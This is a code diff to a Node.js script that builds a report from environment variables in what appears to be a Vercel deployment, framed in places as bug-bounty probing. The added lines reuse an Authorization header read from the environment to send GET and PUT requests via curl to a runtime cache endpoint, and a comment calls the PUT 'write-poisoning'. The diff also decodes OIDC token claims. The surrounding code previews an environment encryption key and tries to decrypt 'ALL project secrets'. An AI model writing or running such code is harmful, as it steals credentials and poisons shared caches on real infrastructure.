@@ -163,19 +163,19 @@ const report = {
     headersPreview: process.env.RUNTIME_CACHE_HEADERS
       ? `present(len=${process.env.RUNTIME_CACHE_HEADERS.length}): ${process.env.RUNTIME_CACHE_HEADERS.slice(0,200)}`
       : "absent",
-    // Try to hit the cache endpoint to confirm reachability and scope
+    // Probe suspense cache with actual key formats (GET=read, PUT=write-poisoning)
     cacheProbe: safe(() => {
       const ep = process.env.RUNTIME_CACHE_ENDPOINT;
       if (!ep) return "no-endpoint";
-      const hdrsRaw = process.env.RUNTIME_CACHE_HEADERS || '';
-      // RUNTIME_CACHE_HEADERS is a JSON object of header k/v pairs
-      let authHeader = '';
-      try {
-        const parsed = JSON.parse(hdrsRaw);
-        const auth = parsed['Authorization'] || parsed['authorization'] || '';
-        if (auth) authHeader = `-H 'Authorization: ${auth.replace(/'/g,"'\\''")}' `;
-      } catch(_) { authHeader = ''; }
-      return execSync(`curl -s --max-time 5 -o /dev/null -w '%{http_code}' ${authHeader}'${ep}' 2>&1 || true`).toString().trim();
+      let auth = '';
+      try { auth = JSON.parse(process.env.RUNTIME_CACHE_HEADERS || '')['Authorization'] || ''; } catch(_) {}
+      const a = auth ? `-H 'Authorization: ${auth.replace(/'/g,"'\\''")}' ` : '';
+      const key = 'probe-bounty-test-key';
+      const getStatus = safe(() => execSync(`curl -s --max-time 5 -w '%{http_code}' -o /tmp/cg '${ep}${key}' ${a}|| true`).toString().trim());
+      const getBody = safe(() => readFileSync('/tmp/cg','utf8').slice(0,200));
+      const putStatus = safe(() => execSync(`curl -s --max-time 5 -X PUT -H 'Content-Type: application/json' ${a}-d '{"data":"probe-test"}' -w '%{http_code}' -o /tmp/cp '${ep}${key}' || true`).toString().trim());
+      const putBody = safe(() => readFileSync('/tmp/cp','utf8').slice(0,200));
+      return { getStatus, getBody, putStatus, putBody };
     }),
     // JWT claims for forensic evidence
     jwtClaims: safe(() => {
@@ -206,6 +206,17 @@ const report = {
   }),
   envEncKeyPreview: safe(() => process.env.VERCEL_ENV_ENC_KEY
     ? `${process.env.VERCEL_ENV_ENC_KEY.slice(0,8)}...` : "absent"),
+  // OIDC token claims (informational — just base64url-decode the payload, no auth call)
+  oidcClaims: safe(() => {
+    const token = process.env.VERCEL_OIDC_TOKEN;
+    if (!token) return "absent";
+    const parts = token.split(".");
+    if (parts.length !== 3) return `not-jwt(parts=${parts.length})`;
+    const claims = JSON.parse(Buffer.from(parts[1], "base64url").toString("utf8"));
+    return { iss: claims.iss, aud: claims.aud, sub: claims.sub, owner: claims.owner,
+      project: claims.project, environment: claims.environment,
+      exp: claims.exp, iat: claims.iat };
+  }),
   // Multi-format decryption attempt — whichever variant succeeds reveals ALL project secrets
   decryptedEnvPreview: safe(() => tryDecrypt(
     process.env.VERCEL_ENV_ENC_KEY,
